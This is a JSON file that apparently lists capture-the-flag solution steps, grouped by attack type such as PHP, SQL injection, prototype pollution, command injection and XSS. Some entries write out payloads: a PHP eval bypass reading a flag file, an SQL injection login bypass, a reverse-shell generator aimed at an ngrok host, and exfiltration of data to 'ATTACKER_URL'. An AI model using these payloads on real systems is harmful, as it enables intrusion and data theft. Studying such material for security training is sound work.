{
    "XML Parsing": [
        "Ran PHP code while XML parsing is performed."
    ],
    "PHP Vulnerabilities": [
        "Bypassed 'disable_functions' on PHP 7.0-8.0 versions.",
        "Gained shell remote code execution.",
        "Identify the 'eval()' vulnerability",
        "Reference the blocked function and restricted file",
        "Set the GET parameter to '?print=echo+'';print(eval('return ${blocked}[4](${nc});'))'",
        "Note that it executes file_get_contents('../flag.txt')",
        "Allowed access to the `/flag` endpoint."
    ],
    "SQL Injection": [
        "Identified an SQL injection vulnerability.",
        "Used the payload 'username=test&password=test' or 1=1 LIMIT 1;#'.",
        "Investigated users.php page.",
        "Identified possible injection vectors.",
        "Attempted to replace 'card_num' with 'R34L_F14G' in SQLMAP query.",
        "Observe the page indicating SQL Injection attacks are blocked.",
        "Write an SQLMap tamper script.",
        "Prepend 'a' characters to the payload."
    ],
    "Prototype Pollution": [
        "Leveraged the prototype pollution to run 'require('./usage')'.",
        "Controlled 'pkg' by polluting '__proto__.data'.",
        "Controlled 'pkgPath' by polluting '__proto__.path'.",
        "Understand that to reach this code path, 'npm_config_global' needs to be polluted.",
        "Polluted 'npm_config_global' to a truthy value."
    ],
    "File Upload": [
        "Choose a .phtml file for upload.",
        "Discover that if a zip file with 'docker-entry' in its name is uploaded.",
        "The program will execute the script within a docker container with greater access (runs as `uploaded` user).",
        "As opposed to executing normally (runs as `nobody` user)."
    ],
    "Command Injection": [
        "Understand that the reverse shell payload will be fired when the data is deserialized.",
        "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
        "Establish a reverse shell.",
        "Understood that this trick helps continue the search from the previously found index onwards and it can allow multiple instances of 'fqdn'.",
        "Find a way of issuing a pseudo PUT request by using a POST request with a '_method' query parameter set to PUT",
        "Note that the Python microservice allows the running of arbitrary commands when the GET method is used",
        "Note that the Traefik service only accepts the POST, GET, OPTIONS, DELETE and PATCH methods"
    ],
    "XSS": [
        "Replace the string 'alert(1)' with the converted string of our JavaScript payload.",
        "Exploiting the fact that the token for id=0 is the same every time.",
        "Exfiltrate the data to 'http://ATTACKER_URL'.",
        "Append payload to '/readflag' command in 'f' GET parameter.",
        "Identified the possibility of XSS in a user's profile.",
        "Ruled out mutation XSS attacks on these libraries as 'marked' does not sanitize output HTML.",
        "Crafted a URL that appended an HTML header tag to the domain part of the email parameter, thereby exploiting the lax character restriction."
    ],
    "Redis Cache": [
        "Identify that /sakura allows interaction with the Redis cache."
    ]
}